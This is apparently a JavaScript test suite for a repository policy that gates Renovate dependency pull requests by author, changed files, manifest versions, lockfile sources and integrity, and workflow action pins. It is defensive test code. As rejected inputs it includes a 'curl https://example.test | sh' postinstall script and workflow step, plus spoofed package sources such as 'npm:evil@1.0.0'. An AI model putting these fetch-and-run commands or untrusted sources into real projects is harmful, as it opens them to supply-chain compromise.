import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { test } from 'node:test';
import { repository } from '../release/policy.mjs';
import { checkDependencyPullRequest } from './pr.mjs';
import {
  isDependencyPullRequest, lockfilePath, manifestPath, validateDependencyFiles, validateLockfile, validateManifestChange, validateWorkflowChange,
} from './policy.mjs';

const base = 'a'.repeat(40);
const head = 'b'.repeat(40);
const pr = (overrides = {}) => ({
  number: 50,
  state: 'open',
  user: { login: 'renovate[bot]', type: 'Bot' },
  head: { ref: 'renovate/astro-monorepo', sha: head, repo: { full_name: repository } },
  base: { ref: 'main', sha: base, repo: { full_name: repository } },
  changed_files: 2,
  body: 'This PR contains the following updates.',
  ...overrides,
});

const manifest = deps => JSON.stringify({ name: 'pos-docs-starlight', private: true, scripts: { build: 'astro build' }, dependencies: deps }, null, 2);
const lock = packages => JSON.stringify({ name: 'pos-docs-starlight', lockfileVersion: 3, packages: { '': {}, ...packages } }, null, 2);
const pkg = (name, version) => ({ version, resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`, integrity: 'sha512-AbC123+/xyz==' });

test('only renovate[bot], from a renovate/* branch of this repository into main, takes the dependency path', () => {
  assert.equal(isDependencyPullRequest(pr()), true);
  for (const [name, change] of Object.entries({
    'a person': { user: { login: 'floxcristian', type: 'User' } },
    'a user named like the bot': { user: { login: 'renovate[bot]', type: 'User' } },
    'another branch': { head: { ...pr().head, ref: 'feature/astro' } },
    'a fork': { head: { ...pr().head, repo: { full_name: 'someone/pos-docs' } } },
    'another base': { base: { ...pr().base, ref: 'release' } },
  })) assert.equal(isDependencyPullRequest(pr(change)), false, name);
});

test('the scope is the site manifest, its lockfile and existing workflows, modified only', () => {
  validateDependencyFiles([{ filename: manifestPath, status: 'modified' }, { filename: lockfilePath, status: 'modified' }, { filename: '.github/workflows/docs-quality.yml', status: 'modified' }]);
  for (const [files, message] of [
    [[], /at least one file/],
    [[{ filename: 'package.json', status: 'modified' }], /may only change/],
    [[{ filename: 'tools/archify/vendor/archify/package.json', status: 'modified' }], /may only change/],
    [[{ filename: 'renovate.json', status: 'modified' }], /may only change/],
    [[{ filename: 'docs/flows/payments.md', status: 'modified' }], /may only change/],
    [[{ filename: '.github/workflows/new.yml', status: 'added' }], /only modify existing files/],
  ]) assert.throws(() => validateDependencyFiles(files), message);
});

test('the manifest may only change versions of the dependencies it already declares', () => {
  validateManifestChange(manifest({ astro: '5.1.0', '@astrojs/starlight': '0.30.0' }), manifest({ astro: '5.2.3', '@astrojs/starlight': '0.31.1' }));
  const before = manifest({ astro: '5.1.0' });
  assert.throws(() => validateManifestChange(before, manifest({ astro: '5.1.0', leftpad: '1.0.0' })), /add or remove/);
  assert.throws(() => validateManifestChange(before, manifest({})), /add or remove/);
  for (const spec of ['git+https://example.test/astro.git', 'file:../astro', 'https://example.test/astro.tgz', 'npm:evil@1.0.0', 'github:someone/astro']) {
    assert.throws(() => validateManifestChange(before, manifest({ astro: spec })), /registry version/, spec);
  }
  const pinned = deps => JSON.stringify({ ...JSON.parse(manifest(deps)), overrides: { 'postcss-nested': { 'postcss-selector-parser': '7.1.6' } } });
  validateManifestChange(pinned({ astro: '5.1.0' }), pinned({ astro: '5.2.3' }));
  assert.throws(() => validateManifestChange(pinned({ astro: '5.1.0' }), pinned({ astro: '5.2.3' }).replace('7.1.6', '7.1.7')), /only dependency versions/, 'overrides are a pin decided by a person');
  const scripted = JSON.parse(manifest({ astro: '5.2.3' }));
  scripted.scripts.postinstall = 'curl https://example.test | sh';
  assert.throws(() => validateManifestChange(before, JSON.stringify(scripted)), /only dependency versions/);
});

test('every package in the lockfile comes from the public registry with a sha512 integrity hash', () => {
  validateLockfile(lock({ 'node_modules/astro': pkg('astro', '5.2.3'), 'node_modules/local': { link: true, resolved: '../local' } }));
  assert.throws(() => validateLockfile(lock({ 'node_modules/astro': { ...pkg('astro', '5.2.3'), resolved: 'https://registry.example.test/astro.tgz' } })), /outside https:\/\/registry\.npmjs\.org/);
  assert.throws(() => validateLockfile(lock({ 'node_modules/astro': { ...pkg('astro', '5.2.3'), resolved: 'git+ssh://git@example.test/astro.git' } })), /outside/);
  assert.throws(() => validateLockfile(lock({ 'node_modules/astro': { ...pkg('astro', '5.2.3'), integrity: undefined } })), /integrity/);
  assert.throws(() => validateLockfile(lock({ 'node_modules/astro': { ...pkg('astro', '5.2.3'), integrity: 'sha1-AbC=' } })), /integrity/);
  assert.throws(() => validateLockfile(JSON.stringify({ lockfileVersion: 1, dependencies: {} })), /v2 or later/);
});

test('the published site lockfile passes as it is in main', () => {
  validateLockfile(readFileSync(new URL(`../../${lockfilePath}`, import.meta.url), 'utf8'));
});

test('a workflow may only move an existing action to another commit', () => {
  const path = '.github/workflows/docs-quality.yml';
  const before = ['jobs:', '  build:', '    steps:', `      - uses: actions/checkout@${'1'.repeat(40)} # v4`, '        with:', '          persist-credentials: false'].join('\n');
  validateWorkflowChange(path, before, before.replace(`${'1'.repeat(40)} # v4`, `${'2'.repeat(40)} # v6`));
  for (const [after, name] of [
    [before.replace('actions/checkout', 'someone/checkout'), 'another action'],
    [before.replace(`@${'1'.repeat(40)} # v4`, '@v6'), 'a mutable tag'],
    [before.replace('persist-credentials: false', 'persist-credentials: true'), 'another line'],
    [`${before}\n      - run: curl https://example.test | sh`, 'an added step'],
  ]) assert.throws(() => validateWorkflowChange(path, before, after), /action pins|existing action/, name);
});

test('the editorial check validates a dependency PR through immutable Git objects', async () => {
  const contents = {
    [base]: { [manifestPath]: manifest({ astro: '5.1.0' }), [lockfilePath]: lock({ 'node_modules/astro': pkg('astro', '5.1.0') }) },
    [head]: { [manifestPath]: manifest({ astro: '5.2.3' }), [lockfilePath]: lock({ 'node_modules/astro': pkg('astro', '5.2.3') }) },
  };
  const blobs = new Map();
  const trees = {};
  for (const revision of [base, head]) {
    trees[revision] = Object.entries(contents[revision]).map(([path, value]) => {
      const bytes = Buffer.from(value);
      const sha = createHash('sha1').update(`blob ${bytes.length}\0`).update(bytes).digest('hex');
      blobs.set(sha, bytes);
      return { path, type: 'blob', mode: '100644', sha };
    });
  }
  const treeSha = revision => (revision === base ? '1' : '2').repeat(40);
  const github = (pull = pr(), files = [manifestPath, lockfilePath]) => async path => {
    const local = path.replace(`repos/${repository}/`, '');
    if (local === 'pulls/50') return { status: 200, value: pull };
    if (local.startsWith('pulls/50/files')) return { status: 200, value: files.map(filename => ({ filename, status: 'modified' })) };
    const commit = /^git\/commits\/([a-f0-9]{40})$/.exec(local);
    if (commit) return { status: 200, value: { sha: commit[1], tree: { sha: treeSha(commit[1]) } } };
    const tree = /^git\/trees\/([a-f0-9]{40})\?recursive=1$/.exec(local);
    if (tree) return { status: 200, value: { truncated: false, tree: trees[tree[1] === treeSha(base) ? base : head] } };
    const blob = /^git\/blobs\/([a-f0-9]{40})$/.exec(local);
    if (blob) return { status: 200, value: { encoding: 'base64', content: blobs.get(blob[1]).toString('base64') } };
    return { status: 404 };
  };
  const result = await checkDependencyPullRequest(github(), 50, { expectedHead: head, expectedBase: base });
  assert.deepEqual([result.head, result.files], [head, [manifestPath, lockfilePath]]);
  await assert.rejects(checkDependencyPullRequest(github(), 50, { expectedHead: 'f'.repeat(40) }), /PR changed/);
  await assert.rejects(checkDependencyPullRequest(github(pr({ changed_files: 1 }), ['README.md']), 50), /may only change/);
  await assert.rejects(checkDependencyPullRequest(github(pr({ state: 'closed' })), 50), /open dependency PR/);
  assert.equal(await checkDependencyPullRequest(github(pr({ user: { login: 'floxcristian', type: 'User' } })), 50), null);
});
